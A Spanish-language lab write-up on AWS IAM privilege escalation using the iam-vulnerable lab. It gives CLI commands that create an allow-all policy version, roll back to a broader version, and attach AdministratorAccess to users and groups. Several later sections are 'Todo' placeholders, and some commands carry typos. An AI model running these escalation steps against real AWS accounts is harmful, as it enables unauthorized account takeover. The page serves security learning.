# Permisos sobre políticas

Es crucial restringir los permisos en las políticas de AWS tanto como limitar los permisos de los usuarios en sus cuentas y en las de otros usuarios. Las políticas son las que conceden los permisos a los usuarios, ya sea como parte de un grupo o al asumir roles. Los permisos se asignan a través de las políticas aplicadas a esos grupos y roles. Por lo tanto, los administradores deben ser muy cuidadosos al otorgar permisos a los usuarios en relación a las políticas. Específicamente, los siguientes permisos de política pueden conducir a una escalada de privilegios:

* iam:CreatePolicyVersion
* iam:SetDefaultPolicyVersion
* iam:AttachUserPolicy
* iam:AttachGroupPolicy
* iam:AttachRolePolicy
* iam:PutUserPolicy
* iam:PutGroupPolicy
* iam:PutRolePolicy

El permiso para crear una nueva versión de la política le permite a un usuario reemplazar completamente los permisos en una política. Si esta política se aplica a ellos, esto abre la puerta para que el usuario simplemente se asigne privilegios administrativos completos de AWS. Adjuntar una política o crear una nueva política para un usuario, grupo o función puede aumentar de manera similar los permisos aplicados al usuario.



## IAM:CreatePolicyVersion

Si un atacante tiene el permiso **iam:CreatePolicyVersion** en AWS, puede crear una nueva versión de una política ya existente. Esto significa que podrían crear una política que permita más permisos de los que tienen actualmente, lo que podría comprometer la seguridad del sistema.

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc1
{% endembed %}

Pasos:

1. Listar políticas existentes
2. Crear y establecer por defecto una política con mayores permisos

### Configuración inicial

Usuario del laboratorio: privesc1-CreateNewPolicyVersion-user

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Encada política existen versiones y donde cada versión puede cambia de forma drástica, se tiene que checar cual es la política por defecto:

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Después crear unas llaves de acceso para utilizar el usuario con AWS CLI. Las llaves de acceso se crean por medio de un usuario administrador, y se simula que se obtuvieron mediante algúna brecha dentro de una auditoría.

{% code overflow="wrap" %}
```
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc1- CreateNewPolicyVersion-role --role-session-name privesc1
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption><p>Generación de llaves en AWS CLI</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption><p>Configuración del usuario privesc1 en AWS CLI</p></figcaption></figure>

Checar que la configuración esté correcta con:

```
aws sts get-caller-identity --profile privesc1
```

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

### Explotación

En este tipo de explotación, se tiene que crear un archivo **JSON** con las políticas que se quieren agregar. Por ejemplo la política de permitir todo:

{% code title="admin_policy.json" overflow="wrap" %}
```json
{
    "Version": "202-03-12",
    "Statement": [
        {
            "Sid": "PermitirTodo",
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
```
{% endcode %}

Despues, subir el archivo con el el uso de la política IAM:CreatePolicyVersion

{% code overflow="wrap" %}
```
aws iam create-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc1- CreateNewPolicyVersion --policy-document file://admin_politica.json --set-as-default --profile privesc1
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>



## _IAM:SetDefaultPolicyVersion_

_Al modificar una política, AWS crea una nueva versión con todos los cambios, estos cambios se pueden hacer rollback. L_os usuarios con el permiso **iam:SetDefaultPolicyVersion** pueden establecer qué versión de la política es la versión predeterminada (activa). Entonces si en el pasadó existió una política con demaciados permisiso, este comando puede regresar a un punto en el tiempo para obtener mayores privilegios.&#x20;

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc2
{% endembed %}

Pasos de explotación:

1. Identificar políticas y versiones
2. Identificar la versión con mas permisos
3. Usar set-default-policy-version a la versión con mayores permisos

### Configuración inicial

Usuario del laboratorio: privesc2-SetExistingDefaultPolicyVersion-

user

<figure><img src="../../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>

Luego configurar el perfil AWS configure y continuar con la explotación

### Explotación

Primero se tiene que listar las versiones de una política y luego listar cuales permisos tienen cada versionado. Para esto se tiene que identificar cual política es la afectada y luego listar las versiones con el siguiente comando:

{% code overflow="wrap" %}
```
aws iam list-policy-versions --policy-arn arn:aws:iam::651927172911:policy/privesc2- SetExistingDefaultPolicyVersion
```
{% endcode %}

{% hint style="info" %}
Este método de ataque, requiere que la política tenga al menos 2 versiones
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Como se observa en la imagen anterior, la versión 1 es la que está por defecto y que existe otra versión la numero 2, se procede a compara cual versión tiene mas privilegios

{% code overflow="wrap" %}
```
aws iam get-policy-version --policy-arn arn:aws:aim::some:some --version-id v3 --profile privesc2
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Se ve que la política que no está por defecto, tiene mas permisos que la política actual

{% code overflow="wrap" %}
```
aws iam get-policy --policy-arn arn:aws:iam::651927172911:policy/privesc2- SetExistingDefaultPolicyVersion
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Finalmente, se procede a realizar el cambio de la política por la versión con más permisos

{% code overflow="wrap" %}
```
aws iam set-default-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc2- SetExistingDefaultPolicyVersion --version-id v2 --profile privesc2
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>



## IAM:AttachUserPolicy

Un atacante con el permiso **iam:AttachUserPolicy** puede aumentar los privilegios existentes adjuntando una política a un usuario al que tiene acceso, agregando los permisos de esa política al atacante.

Este Permiso fue explotado contra la empresa Expel en abril del 2022 por medio de credenciales encontradas en un repositorio de código público.

{% embed url="https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/" %}

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc7
{% endembed %}

### Configuración inicial

Usuario del laboratorio: privesc7-AttachUserPolicy-user con el siguiente rol:

<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Luego, generar llaves de acceso para AWS CLI

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### Explotación

Para esta explotación, se necesita conocer si existe una política que con mayores permisos, se tiene que hace un listado de políticas por algún medio o utilizar las políticas por defecto de AWS, en este caso se usara la política **AdminsitratorAccess** que viene por defecto en AWS y se sabe que existe. Después, solo se utiliza el comando attach-user-policy indicando a cual usuario con cual ARN de política se va a agregar.

{% code overflow="wrap" %}
```
aws iam attach-user-policy --user-name privesc7-AttachUserPolicy-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile privesc7
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>pwned</p></figcaption></figure>

Como se ve en la salida de los comandos anteriores, se hizo correctamente la adición de una política de administradores, escalando privilegios.



## IAM:AttachGroupPolicy

Equivalente al anterior método, este permiso permite **aumentar los privilegios de un grupo** adjuntado políticas al grupo, no afecta a las políticas propias del usuario

{% hint style="warning" %}
Este método de ataque, añade políticas a un grupo si varios usuarios se encuentran en el grupo, todos ellos tendrán elevación de privilegios.
{% endhint %}

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc8
{% endembed %}

### Configuración inicial

Usuario del laboratorio: privesc8-AttachGroupPolicy-user con el rol:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Después, agregar las llaves a AWS CLI.

### Explotación

Dado que los miembros de un grupo heredan los permisos de las políticas asociadas al grupo, solo se tiene que saber el grupo al cual pertenece el usuario y la política que se va a agregar al grupo:

{% hint style="info" %}
Si el usuario del cual se conocen las credenciales y se tiene el rol **IAM:AttachGroupPolicy** no pertenece a ningún grupo, no se podrá realizar una escalación de privilegios, pero si afectar los permisos de los demás grupos.

Se podría buscar la forma de modificar un grupo y después añadir el usuario al grupo afectado para hacer la escalación de privilegios, usando múltiples técnicas aquí descritas.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

En este caso el nombre del grupo se sacó por medio web, se puede realiza el comando `aws iam list-groups-for-user --user-name <User>` pero requiere permisos de IAM de list.

Finalmente se agrega la política con permisos avanzados al grupo seleccionado

{% code overflow="wrap" %}
```
aws iam attach-group-policy --group-name privesc8-AttachGroupPolicy-group --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile privesc8
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



## IAM:AttachRolePolicy

Un atacante con el permiso **iam:AttachRolePolicy** puede aumentar los privilegios adjuntando una política a una función a la que tiene acceso, agregando los permisos de esa política al atacante.

### Configuración inicial

Todo

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}

Usuario del laboratorio: todo\_User con el rol:





### Explotación

Todo



## IAM:PutUserPolicy

Un atacante con el permiso **iam:PutUserPolicy** puede aumentar los privilegios creando o actualizando una política en línea para un usuario al que tiene acceso, agregando los permisos de esa política al atacante.

### Configuración inicial

Todo

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}

Usuario del laboratorio: privesc8-AttachGroupPolicy-user con el rol:





### Explotación

Todo



## IAM:PutGroupPolicy

Un atacante con el permiso **iam:PutGroupPolicy** puede aumentar los privilegios creando o actualizando una política en línea para un grupo del que forma parte, agregando los permisos de esa política al atacante.

### Configuración inicial

Todo

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}

Usuario del laboratorio: privesc8-AttachGroupPolicy-user con el rol:





### Explotación

Todo



## IAM:PutRolePolicy

Un atacante con el permiso **iam:PutRolePolicy** puede aumentar los privilegios creando o actualizando una política en línea para un rol al que tiene acceso, agregando los permisos de esa política al atacante.

### Configuración inicial

Todo

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}

Usuario del laboratorio: privesc8-AttachGroupPolicy-user con el rol:





### Explotación

Todo



